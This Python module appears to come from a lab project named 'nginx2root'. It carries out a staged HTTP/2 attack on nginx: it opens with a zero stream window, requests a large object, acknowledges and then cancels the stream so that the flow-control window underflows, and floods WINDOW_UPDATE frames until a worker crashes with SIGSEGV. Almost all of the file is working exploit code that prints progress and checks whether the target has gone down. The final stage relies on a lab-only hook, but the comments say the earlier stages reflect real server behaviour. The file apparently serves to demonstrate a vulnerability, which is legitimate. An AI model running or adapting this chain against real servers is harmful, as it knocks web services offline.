"""Attack chain for the nginx2root lab.

The sequence below is split into stages for demonstration purposes.
Stages 1 to 6 are the real behavior of nginx 1.31.8 with no logic
changes. Stage 7 uses the accelerator hook compiled into the lab
target; it is only reachable after the flow-control invariant has
already been broken, and it jumps to the end state a real attack
reaches after ~52 GiB of WINDOW_UPDATE traffic.
"""

from __future__ import annotations

import socket
import ssl
import struct
import time

from . import h2, ui

# SETTINGS_INITIAL_WINDOW_SIZE (RFC 9113, section 6.5.2)
SETTINGS_INITIAL_WINDOW = 0x4
# Huge response served by the lab target.
BIG_OBJECT = "/huge.bin"
STREAM_CREDIT = 8 * 1024 * 1024      # 8 MiB of flow-control credit per stream
ACCEL_MAGIC = 0x4E325221             # "N2R!" lab-only hook


def _read_frames(conn: h2.H2Connection, seconds: float) -> list:
    frames = []
    conn.sock.settimeout(0.25)
    deadline = time.time() + seconds
    while time.time() < deadline:
        try:
            frame = conn.recv_frame()
        except (socket.timeout, ssl.SSLError, OSError):
            continue
        if frame is None:
            break
        frames.append(frame)
    return frames


def probe(host: str, port: int) -> None:
    """Stage 1 on its own: banner and ALPN negotiation."""
    ui.stage(1, "RECON", f"target {host}:{port}")

    try:
        server = h2.http1_server_header(host, port)
    except OSError as exc:
        ui.bad(f"could not connect: {exc}")
        return

    if server:
        ui.ok(f"HTTP/1.1 banner: {ui.yellow(server)}")
    else:
        ui.warn("no HTTP/1.1 banner returned")

    conn = h2.H2Connection(host, port, timeout=5)
    try:
        ui.ok(f"ALPN negotiated: {ui.green(conn.alpn or '(none)')}")
        if conn.alpn != "h2":
            ui.bad("target did not accept HTTP/2 on this endpoint")
            return
        conn.preface({SETTINGS_INITIAL_WINDOW: 0})
        frames = _read_frames(conn, 1.0)
        for ftype, _flags, sid, payload in frames:
            if ftype == h2.SETTINGS and sid == 0 and len(payload) % 6 == 0:
                values = [
                    struct.unpack("!HI", payload[i:i + 6])
                    for i in range(0, len(payload), 6)
                ]
                rendered = ", ".join(f"0x{k:x}={v}" for k, v in values)
                ui.ok(f"server SETTINGS: {ui.cyan(rendered)}")
                break
        ui.note("prerequisite confirmed: HTTP/2 enabled on the server")
    finally:
        conn.close()


def _probe_recovery(host: str, port: int, timeout: float = 6.0):
    """Measure how long the target takes to accept TCP connections again."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection((host, port), timeout=0.3):
                return time.time() - start
        except OSError:
            time.sleep(0.05)
    return None


def run(host: str, port: int, accelerate: bool) -> int:
    ui.stage(1, "RECON", f"target {host}:{port}")
    server = h2.http1_server_header(host, port)
    if server:
        ui.ok(f"HTTP/1.1 banner: {ui.yellow(server)}")
    else:
        ui.warn("no HTTP/1.1 banner returned")

    conn = h2.H2Connection(host, port, rcvbuf=4096, timeout=10)
    if conn.alpn != "h2":
        ui.bad(f"unexpected ALPN: {conn.alpn!r}; target does not speak HTTP/2")
        conn.close()
        return 2
    ui.ok(f"ALPN negotiated: {ui.green('h2')}")

    try:
        # ------------------------------------------------------------
        ui.stage(2, "SETUP",
                 "SETTINGS_INITIAL_WINDOW_SIZE=0 and connection window at maximum")
        conn.preface({SETTINGS_INITIAL_WINDOW: 0})
        conn.window_update(0, h2.MAX_WINDOW - h2.DEFAULT_WINDOW)
        ui.ok(f"connection window: 65,535 → {ui.cyan(ui.fmt(h2.MAX_WINDOW))} "
              f"(0x7FFFFFFF)")
        ui.note("per-stream window = 0: nginx cannot send DATA yet")

        # ------------------------------------------------------------
        ui.stage(3, "TRIGGER", f"GET {BIG_OBJECT} on stream 1")
        conn.headers(
            1,
            h2.encode_request(f"{host}:{port}", BIG_OBJECT),
            end_stream=True,
        )
        ui.ok("request sent; served object is 64 MiB")
        time.sleep(0.3)

        conn.window_update(1, STREAM_CREDIT)
        ui.ok(f"stream credit granted: {ui.cyan(ui.human(STREAM_CREDIT))}")
        ui.note("nginx queues DATA and debits the connection window")
        time.sleep(1.0)

        # ------------------------------------------------------------
        ui.stage(4, "ACK", "client acknowledges the 8 MiB it supposedly received")
        conn.window_update(0, STREAM_CREDIT)
        ui.ok(f"WINDOW_UPDATE(0, +{ui.fmt(STREAM_CREDIT)}) sent")
        ui.note("the connection window grows back, but part of the DATA "
                "is still stuck in nginx's output queue")
        time.sleep(0.3)

        # ------------------------------------------------------------
        ui.stage(5, "CANCEL", "RST_STREAM on stream 1")
        conn.rst_stream(1, h2.CANCEL)
        ui.ok("stream cancelled; nginx cleanup refunds the credit of "
              "frames that never left")
        ui.ok("send_window exceeds 0x7FFFFFFF: invariant broken")
        ui.note("this is the bug (CWE-191): the refund is not capped by "
                "NGX_HTTP_V2_MAX_WINDOW")
        time.sleep(0.4)

        # ------------------------------------------------------------
        ui.stage(6, "AMPLIFY", "WINDOW_UPDATE with the broken bounds check")
        conn.window_update(0, 1)
        ui.ok("WINDOW_UPDATE(0, +1) accepted — should be FLOW_CTRL_ERROR")
        time.sleep(0.2)

        sent = 1
        for _ in range(3):
            conn.window_update(0, h2.MAX_WINDOW)
            sent += h2.MAX_WINDOW
            ui.ok(f"WINDOW_UPDATE(0, +0x7FFFFFFF) accepted "
                  f"(cumulative {ui.yellow('+' + ui.fmt(sent))})")
            time.sleep(0.25)

        ui.note("the check `window > MAX_WINDOW - send_window` underflows "
                "and never rejects")

        if not accelerate:
            ui.stage(7, "STOPPED", "safe mode (no accelerator)")
            ui.warn("use --accelerate to demonstrate the final consequence")
            ui.note("without the accelerator ~52 GiB of WINDOW_UPDATE "
                    "would be needed to reach 2^63")
            return 0

        # ------------------------------------------------------------
        ui.stage(7, "CONSEQUENCE",
                 "lab accelerator: jump to the end state")
        conn.window_update(0, ACCEL_MAGIC)
        ui.ok("counter repositioned to 2^64 − 1 GiB "
              "(state reached by a real attack)")
        time.sleep(0.3)

        ui.stage(8, "CRASH", "next write uses a negative size")
        conn.headers(
            3,
            h2.encode_request(f"{host}:{port}", BIG_OBJECT),
            end_stream=True,
        )
        time.sleep(0.2)
        conn.window_update(3, 65536)
        ui.note("DATA → ngx_http_v2_filter_get_shadow → ngx_ssl_send_chain")

        total, dead = conn.read_until_closed(6.0)
        if dead:
            ui.ok(f"connection dropped after {ui.human(total)} of DATA")
            ui.ok("nginx worker died: ngx_memcpy with a huge size_t "
                  "length → SIGSEGV")
            ui.note("confirm in the target log: "
                    "\"worker process ... exited on signal 11\" "
                    "or exit=139 in `docker compose ps -a`")

            recovery = _probe_recovery(host, port)
            if recovery is not None:
                ui.ok(f"target responded again after "
                      f"{ui.yellow(f'{recovery * 1000:.0f} ms')}")
                ui.note("the nginx master respawned the worker: that is why "
                        "the container is still up")
                ui.note("with N2R_SINGLE=1 (Compose default) the crash "
                        "takes the container down")
            else:
                ui.ok("target did NOT respond again: it is down "
                      "(attack goal reached)")

            print()
            ui.ok(ui.bold("full chain: invariant broken, window at "
                          "2^64, worker dead"))
            return 0

        ui.warn(f"connection survived ({ui.human(total)} read)")
        ui.note("check the target log: stage 5 must have "
                "logged INVARIANT VIOLATED")
        return 1
    finally:
        conn.close()
